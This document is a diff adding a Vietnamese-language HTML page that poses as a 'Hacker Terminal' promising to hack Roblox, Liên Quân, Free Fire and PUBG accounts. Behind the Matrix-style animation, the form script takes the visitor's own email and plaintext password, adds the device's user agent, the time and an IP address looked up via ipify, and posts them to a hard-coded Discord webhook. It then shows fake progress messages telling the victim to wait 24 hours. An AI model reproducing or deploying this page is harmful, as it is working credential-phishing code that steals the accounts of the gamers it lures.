@@ -1,1 +1,385 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Hacker Terminal</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: url('https://wallpapercave.com/wp/wp9129349.jpg') no-repeat center center fixed;
+      background-size: cover;
+      overflow: hidden;
+      color: #00ff00;
+      font-family: "Courier New", Courier, monospace;
+    }
+
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 0;
+    }
+
+    .overlay {
+      position: relative;
+      z-index: 1;
+      padding: 20px;
+      background-color: rgba(0, 0, 0, 0.8);
+      min-height: 100vh;
+    }
+
+    .terminal {
+      white-space: pre-wrap;
+      overflow: hidden;
+      min-height: 400px;
+    }
+    
+    .cursor {
+      display: inline-block;
+      width: 10px;
+      background-color: #00ff00;
+      animation: blink 1s step-end infinite;
+    }
+
+    @keyframes blink {
+      50% { background-color: transparent; }
+    }
+
+    .login-form {
+      display: none;
+      margin-top: 20px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      background-color: black;
+      border: 1px solid #00ff00;
+      color: #00ff00;
+      padding: 8px;
+      margin: 5px 0;
+      width: 250px;
+    }
+
+    button {
+      background-color: transparent;
+      border: 1px solid #00ff00;
+      color: #00ff00;
+      padding: 8px 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #00ff00;
+      color: black;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="loadingOverlay" style="
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.4);
+    color: #00ff00;
+    font-family: 'Courier New', monospace;
+    font-size: 20px;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
+    backdrop-filter: blur(5px);
+    -webkit-backdrop-filter: blur(5px);
+  ">
+    <div>Đang xử lý<span id="loadingDots">.</span></div>
+  </div>
+
+  
+  <div id="toast" style="
+    display: none;
+    position: fixed;
+    bottom: 30px;
+    right: 30px;
+    background-color: #111;
+    color: #00ff00;
+    border: 1px solid #00ff00;
+    padding: 10px 20px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    z-index: 10000;
+    border-radius: 4px;
+  ">Thông tin đã được gửi thành công!</div>
+ 
+
+<canvas id="matrixCanvas"></canvas>
+
+  <div class="overlay">
+    <div class="terminal" id="terminal"></div>
+
+    <div class="login-form" id="loginForm">
+      <form id="form">
+        <label>Email:</label><br>
+        <input type="email" id="email" required><br>
+        <label>Mật khẩu:</label><br>
+        <input type="password" id="password" required><br>
+        <button type="submit">Done</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Beep sound -->
+  <audio id="beep" src="https://freesound.org/data/previews/64/64302_634166-lq.mp3" preload="auto"></audio>
+
+  <!-- Background music -->
+  <audio autoplay loop>
+    <source src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_1eec79d5ec.mp3?filename=cyberpunk-moonlight-sonata-20699.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+    // Terminal logic
+    const terminal = document.getElementById("terminal");
+    const loginForm = document.getElementById("loginForm");
+    const form = document.getElementById("form");
+    const emailInput = document.getElementById("email");
+    const passInput = document.getElementById("password");
+    const beepSound = document.getElementById("beep");
+
+    let userEmail = "";
+    let userPass = "";
+    let hasLoggedIn = false;
+
+    function startHackingSequence() {
+      terminal.innerHTML = "";
+      let text = [];
+
+      if (!hasLoggedIn) {
+        text = [
+          "[+]       Hỗ trợ: Roblox, Liên Quân, Free Fire, PUBG",        
+          "[+]               Tỉ lệ thành công: 80%",  
+          "[+]                Tỉ lệ thất bại: 20%",  
+          "",
+          "",
+          "[+]               Đang kết nối đến server...",
+          "",
+          "[+] Khởi động môi trường ảo...",
+          "[+] Đã xác minh quyền root!",
+          "",
+          "[!] Xác thực...",
+          "",
+          "[!] Truy cập hệ thống nội bộ...",
+          "",
+          "[+] Tải dữ liệu bí mật...",
+          "",
+          "[!] Dữ liệu từ R2LX: [**************]",
+          "[?] Đã kết nối thành công với R2LX và cayngaydem",
+          "[+] Đã hoàn tất. Đã kết nối.",
+          "[+] Hãy nhập thông tin acc."
+        ];
+      } else {
+        text = [
+          "[+]       Hỗ trợ: Roblox, Liên Quân, Free Fire, PUBG",        
+          "[+]               Tỉ lệ thành công: 80%",  
+          "[+]                Tỉ lệ thất bại: 20%",  
+          "[+] Đang kết nối đến server...",
+          "[!] Xác thực...",
+          "[+] Truy cập hệ thống nội bộ...",
+          "[+] Tải dữ liệu bí mật...",
+          "[+] Đã kết nối với acc. Acc của bạn là: ",
+          `[!] Email: ${userEmail}`,
+          `[!] Mật khẩu: ${"*".repeat(userPass.length)}`,
+          "[+] Tải mô-đun tấn công mạng...",
+          "[+] Đã hoàn tất. Đóng kết nối.",
+          "[+] Không thể kết nối với Email và mật khẩu.",
+          "[+] Đang thử lấy kết nối từ hệ thống.",
+          ".....................................................................",
+          ".....................................................................",
+          ".....................................................................",
+          "[+] Đang cố gắng lấy vui lòng đợi thêm",
+          ".....................................................................",
+          ".....................................................................",
+          "[+] Đã bị ngất kết nối hãy kiểm tra lại internet.",
+          ".....................................................................",
+          ".....................................................................",
+          "[!] Không tìm thấy internet.",
+          "[!] Đang lấy internet dự phòng.",
+          "[+] Kết nối đến vệ tinh quân sự...",
+          "                        Đang lấy.",
+          "Đang kết nối lại.",
+          ".....................................................................",
+          ".....................................................................",
+          ".....................................................................",
+          ".....................................................................",
+          ".....................................................................",
+          ".....................................................................",
+          "[+] Đã lấy thành công. Đang kết nối.",
+          ".....................................................................",
+          "[+] Xong",
+          "[+] Đang dò username & password...",
+          "[+] Đã lấy acc thành công",
+          "[+] DONE",
+          "[!] Hãy đợi nhiều nhất 24h.",
+          "[+] Acc sẽ được hacker lại và sẽ ở Email đã nhập",
+          "[+] Đăng nhập thành công vào hệ thống!",
+          "[=] Bypass hệ thống mã hoá... Thành công!",
+          "[+] Truy xuất dữ liệu nội bộ...",
+          "  -> Tệp: confidential_acc.zip... OK",
+          "  -> Tệp: confidential_TaiKhoan.zip... OK",
+          "  -> Tệp: confidential_Gmail.zip... OK",
+          "  -> Tệp: confidential_MatKhau.zip... OK",  
+          "  -> Tệp: Hacker_Roblox.zip... OK",
+          "  -> Tệp: Hacker_FreeFire.zip... OK",          
+          "  -> Tệp: Hacker_LienQuan.zip... OK",  
+          "  -> Tệp: Hacker_PUBG.zip... OK",                  
+          "[!] Xóa dấu vết khỏi server...: DONE",
+          "[+] Xóa log: DONE",
+          "===> HACK HOÀN TẤT! Tắt kết nối.",
+          "Cảm ơn bạn đã sử dụng Hacker Pro Terminal.",
+        ];
+      }
+
+      let line = 0;
+      let char = 0;
+      const speed = 50;
+
+      function type() {
+        if (line < text.length) {
+          if (char < text[line].length) {
+            terminal.innerHTML += text[line].charAt(char);
+            char++;
+            playBeep();
+            setTimeout(type, speed);
+          } else {
+            terminal.innerHTML += "\n";
+            line++;
+            char = 0;
+            setTimeout(type, speed * 4);
+          }
+        } else {
+          terminal.innerHTML += "\n> <span class='cursor'></span>";
+          if (!hasLoggedIn) {
+            loginForm.style.display = "block";
+          }
+        }
+      }
+
+      type();
+    }
+
+    function playBeep() {
+      beepSound.currentTime = 0;
+      beepSound.play().catch(() => {});
+    }
+
+    
+form.addEventListener("submit", function (e) {
+  e.preventDefault();
+  userEmail = emailInput.value;
+  userPass = passInput.value;
+  hasLoggedIn = true;
+  loginForm.style.display = "none";
+
+  const now = new Date();
+  const time = now.toLocaleTimeString('vi-VN');
+  const date = now.toLocaleDateString('vi-VN');
+  const userAgent = navigator.userAgent;
+
+  const webhookURL = "https://discord.com/api/webhooks/1334069985286422569/FnAms2DI2uf8dtLWPI3IW0Xo913fsgoXdfteV8v0xKTpwgM81N1xGHH1MBKZjvgKx89s"; // <- THAY webhook thật vào đây
+
+  fetch("https://api.ipify.org?format=json")
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.ip;
+
+      const payload = {
+        embeds: [{
+          title: "HACKER LOG",
+          color: 65280,
+          fields: [
+            { name: "Email", value: userEmail, inline: true },
+            { name: "Mật khẩu", value: userPass, inline: true },
+            { name: "Thiết bị", value: userAgent, inline: false },
+            { name: "Ngày", value: date, inline: true },
+            { name: "Giờ", value: time, inline: true },
+            { name: "IP", value: ip, inline: false }
+          ],
+          footer: {
+            text: "Gửi từ Hacker Terminal"
+          },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      }).then(() => {
+        const toast = document.getElementById("toast");
+        toast.style.display = "block";
+        setTimeout(() => { toast.style.display = "none"; }, 4000);
+      });
+    });
+
+  // Loading giả lập
+  const loading = document.getElementById("loadingOverlay");
+  const dots = document.getElementById("loadingDots");
+  let dotCount = 1;
+
+  loading.style.display = "flex";
+
+  const dotInterval = setInterval(() => {
+    dotCount = (dotCount % 3) + 1;
+    dots.textContent = ".".repeat(dotCount);
+  }, 500);
+
+  setTimeout(() => {
+    clearInterval(dotInterval);
+    loading.style.display = "none";
+    startHackingSequence();
+  }, 5000);
+});
+
+
+    // Matrix effect
+    const canvas = document.getElementById("matrixCanvas");
+    const ctx = canvas.getContext("2d");
+
+    canvas.height = window.innerHeight;
+    canvas.width = window.innerWidth;
+
+    const letters = "アァイィウエカキクケコABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    const fontSize = 25;
+    const columns = canvas.width / fontSize;
+    const drops = Array(Math.floor(columns)).fill(1);
+
+    function draw() {
+      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+      ctx.fillStyle = "#0F0";
+      ctx.font = fontSize + "px monospace";
+
+      for (let i = 0; i < drops.length; i++) {
+        const text = letters[Math.floor(Math.random() * letters.length)];
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+          drops[i] = 0;
+        }
+
+        drops[i]++;
+      }
+    }
+
+    setInterval(draw, 33);
+
+    // Start
+    startHackingSequence();
+  </script>
+</body>
+  </html>
